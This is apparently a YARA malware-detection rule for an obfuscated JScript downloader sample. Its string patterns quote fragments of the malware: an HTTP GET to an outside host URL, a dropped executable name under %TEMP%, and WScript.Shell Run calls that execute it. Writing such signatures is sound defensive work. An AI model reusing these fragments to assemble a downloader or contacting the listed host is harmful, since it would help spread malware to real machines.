rule sig_20160328_2cccf98a10a6113ee6475710dc3edee9 {
  meta:
    description = "datamaliciousorder - file 20160328_2cccf98a10a6113ee6475710dc3edee9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e2a119de8bd75e00d3bc8cca9d4014a0ab80229557db7af8232a30f2272dbd28"

  strings:
    $s1  = "function Ehwnpvi() {return Pgejmoo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PJjUX8rKs.exe\";};" fullword ascii
    $s2  = "Kkerzg[Snzsma](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Souvjc](Wimgvqlkhd() * 11)} while (Kkerzg[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Pgejmoo = function Iavezpi() {return WScript[Kgyoey](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Zvvvcvb(Ffayahqrc, Wavjmmghfm){return Ffayahqrc - Wavjmmghfm;};" fullword ascii
    $s6  = "function Rlqgzg(Ktyagg){Pgejmoo[\"Run\"](Ktyagg, Myhex, Myhex);};" fullword ascii
    $s7  = "function Pavtwugn() {return ((Syeln == true) && (Syeln == Hnorcybcu)) ? 1 : Myhex;};" fullword ascii
    $s8  = "return Zvvvcvb(Apsgd, Qveajpl);" fullword ascii
    $s9  = "var Iuuhlv = false;" fullword ascii
    $s10 = "function Umqez(){return Ielzi;};" fullword ascii
    $s11 = " while (Lldvfcqjxw){" fullword ascii
    $s12 = "Syeln = true; " fullword ascii
    $s13 = "function Qrabl(Fsmscvq) {var Xdabxtwepj = (1, 2, 3, 4, 5, Fsmscvq); return Xdabxtwepj;};" fullword ascii
    $s14 = "Hnorcybcu = true; " fullword ascii
    $s15 = "function Sxczd()" fullword ascii
    $s16 = "var Syeln = false;" fullword ascii
    $s17 = "var Gcgilpnddb = new this[\"Date\"]();" fullword ascii
    $s18 = "function Wimgvqlkhd(){return 22;};" fullword ascii
    $s19 = "var Hnorcybcu = false;" fullword ascii
    $s20 = "function Qmpciu(){return Kgyoey;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}